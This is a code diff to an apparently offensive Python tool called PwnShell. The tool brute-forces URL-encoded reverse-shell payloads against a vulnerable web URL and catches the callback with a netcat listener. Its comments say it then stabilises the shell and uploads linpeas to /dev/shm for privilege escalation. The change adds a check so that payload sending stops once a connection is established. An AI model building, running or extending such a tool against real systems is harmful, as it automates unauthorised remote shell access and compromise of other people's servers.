@@ -37,7 +37,7 @@ class PwnShell:
         self.iteration=0
         self.listt=[]
         self.encoded_payload=None
-
+        self.connected = False
         ########################################################################
         ###################### Specifying OS ###################################
         if self.type == "linux" or self.type == "l":
@@ -93,6 +93,7 @@ class PwnShell:
     def listener(self):  # setting up the nc listener & stablizing the shell then uploading linpeas to /dev/shm
         nc = nclib.Netcat(listen=('', self.port))
         print(colors.get_colored_text("\n\n[!]STAGE #2 --> [INFO] <--", ColorsSet.ORANGE))
+        self.connected = True
         print(f"[*]CONNECTED TO --> ['{self.ip}',{self.port}]")
         if self.method == "get" or self.method == "GET":
         	print("[+]Vulnerable URL:",self.url)
@@ -150,16 +151,31 @@ class PwnShell:
             burp.join()
 
     ############################################################################################
+    ################################ Check If we got connection ################################
+    def is_port_in_use(self):
+    	output = os.popen('netstat -lant').read()
+    	lines = output.split('\n')
+    	for line in lines:
+    		if str(self.port) in line:
+    			if line.split()[-1] == 'ESTABLISHED':
+    				return True
+    	return False
+    ############################################################################################
     ###################################  SENDING THE PAYLOADS #################################
     def send_payload(self):
+    	
     	if not self.file:
     		payloads = PayLoads(self.ip, self.port,self.nodejs).payloads()
     		print(colors.get_colored_text("[!]STAGE #1 --> [BRUTEFORCE] <--", ColorsSet.ORANGE))
     		for payload in payloads:
+    			if self.connected:
+    				return
     			self.encoded_payload = self.get_url_encoded_payload(payload)
     			self.iteration += 1
     			print(f'[*]Trying payload [{self.iteration}/{len(self.listt)}] : {payload}',end='\r',flush=True)
-    			time.sleep(2)  # Change this ASAP !!!
+    			time.sleep(2)
+    			if self.is_port_in_use():
+    				break
     			self.send_request()
 
     ###############################################################################################
